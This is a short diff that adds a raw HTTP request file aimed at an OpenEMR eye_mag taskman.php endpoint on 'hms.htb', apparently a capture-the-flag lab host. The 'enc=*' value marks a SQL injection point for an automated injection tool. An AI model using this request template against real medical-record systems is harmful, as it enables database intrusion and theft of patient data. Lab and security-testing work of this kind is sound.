@@ -1,0 +1,5 @@
+GET /interface/forms/eye_mag/taskman.php?action=make_task&from_id=1&to_id=1&pid=1&doc_type=1&doc_id=1&enc=* HTTP/1.1
+Host: hms.htb
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Connection: close
+
